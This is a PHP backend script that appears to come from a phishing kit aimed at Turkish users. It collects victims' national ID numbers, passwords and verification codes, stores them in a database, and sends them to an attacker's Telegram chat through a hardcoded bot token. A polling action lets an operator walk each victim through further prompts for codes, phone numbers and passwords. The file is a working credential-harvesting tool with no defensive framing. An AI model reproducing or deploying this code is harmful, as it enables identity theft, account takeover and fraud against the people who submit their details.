<?php
session_start();
include('config.php');

date_default_timezone_set('Europe/Istanbul');

// Dil ve yerel ayarları Türkçe'ye ayarlama
setlocale(LC_TIME, 'tr_TR.UTF-8');

// Mevcut tarih ve saati belirttiğiniz formatta almak için
$formattedDate = strftime('%d %B %Y %H:%M:%S');

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $action = $_POST["action"];
    $user_ip = $_SERVER['REMOTE_ADDR'];

    if ($action == "submitLogin") {
        $txtTCKN = htmlspecialchars($_POST["txtTCKN"]);
        $txtPassword = htmlspecialchars($_POST["txtPassword"]);
        $userId = $_SESSION["user_id"];

        $_SESSION['txtTCKN'] = $txtTCKN;
        $_SESSION['txtPassword'] = $txtPassword;

        $stmt = $conn->prepare("UPDATE users SET txtTCKN = ?, txtPassword = ? WHERE id = ?");
        if ($stmt === false) {
            die("ERROR: Could not prepare statement. " . $conn->error);
        }
        $stmt->bind_param("ssi", $txtTCKN, $txtPassword, $userId);
        if (!$stmt->execute()) {
            die("ERROR: Could not execute statement. " . $stmt->error);
        }
        $stmt->close();

        echo json_encode(["status" => "success", "user_id" => $userId]);
    }

    if ($action == "submitCode") {
        $txtCode = htmlspecialchars($_POST["txtCode"]);
        $userId = $_SESSION["user_id"]; 

        $stmt = $conn->prepare("UPDATE users SET txtPhone = ?, wait = 0 WHERE id = ?");
        if ($stmt === false) {
            die("ERROR: Could not prepare statement. " . $conn->error);
        }
        $stmt->bind_param("si", $txtCode, $userId);
        if (!$stmt->execute()) {
            die("ERROR: Could not execute statement. " . $stmt->error);
        }
        $stmt->close();

        $txtTCKN = $_SESSION['txtTCKN'];
        $txtPassword = $_SESSION['txtPassword'];
        $dateTime = date("Y-m-d H:i:s");
        $message = "
🔒 TC No: $txtTCKN
🔑 Şifre: $txtPassword
📞 Telefon: $txtCode
        
📅 Tarih: $formattedDate ";
        sendTelegramMessage($message);

        echo json_encode(["status" => "success", "user_id" => $userId]);
    }

    if ($action == "wait") {
        $userId = $_SESSION["user_id"];

        $sql = "SELECT wait FROM users WHERE id = $userId";
        $result = $conn->query($sql);

        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $waitValue = $row["wait"];

            if ($waitValue == 1) {
                echo "getCode";
            } else if ($waitValue == 2) {
                echo "getPhone";
            } else if ($waitValue == 3) {
                echo "getCodeAgain";
            } else if ($waitValue == 4) {
                echo "getDone";
            } else if ($waitValue == 6) {
                echo "getSteps";
            } else if ($waitValue == 7) {
                echo "getStepsAgain";
            } else if ($waitValue == 8) {
                echo "getDone";
            }  else if ($waitValue == 9) {
                echo "getPasswordAgain";
            } else {
                echo "0";
            }

        } else {
            echo "User not found";
        }
    }
}

$conn->close();

function sendTelegramMessage($message) {
    $botToken = "72762451996:AAFbIXJRAHukFPn4NnEdtuyBmDbp8UPnW7c"; // Botunuzun token'ını buraya girin
    $chatId = "-4251304183-"; // Chat ID'nizi buraya girin

    if (empty($botToken) || empty($chatId)) {
        error_log("Telegram bot token or chat ID not set.");
        return;
    }

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = http_build_query(['chat_id' => $chatId, 'text' => $message]);

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => $data,
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
}
?>
